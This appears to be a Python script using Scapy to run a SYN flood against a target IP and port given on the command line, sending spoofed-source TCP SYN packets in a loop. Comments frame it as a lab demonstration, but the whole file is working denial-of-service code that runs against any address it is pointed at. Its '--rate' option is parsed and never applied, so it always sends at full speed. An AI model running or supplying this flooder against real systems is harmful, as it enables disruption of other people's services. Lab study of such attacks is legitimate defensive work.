from scapy.all import IP, TCP, send
import random
import argparse
import time

def syn_flood(target_ip, target_port, count):
    print(f"[*] Starting SYN flood on {target_ip}:{target_port} with {count} packets...")
    for i in range(count):
        # Spoof source IP (optional, but good for demonstration)
        # In a real lab, you might want to use a specific spoofed range
        src_ip = "192.168.56." + str(random.randint(2, 254))
        src_port = random.randint(1024, 65535)
        
        # Build SYN packet
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        
        # Send packet
        send(ip_layer/tcp_layer, verbose=False)
        
        if i % 100 == 0 and i > 0:
            print(f"[+] Sent {i} packets...")

def main():
    parser = argparse.ArgumentParser(description="Controlled SYN Flood Generator")
    parser.add_argument("ip", help="Target Server IP address")
    parser.add_argument("port", type=int, help="Target Server port")
    parser.add_argument("--count", type=int, default=1000, help="Number of SYN packets to send")
    parser.add_argument("--rate", type=float, default=0, help="Delay between packets (0 for max speed)")

    args = parser.parse_args()
    
    start_time = time.time()
    syn_flood(args.ip, args.port, args.count)
    end_time = time.time()
    
    print(f"[*] Finished. Sent {args.count} packets in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    main()
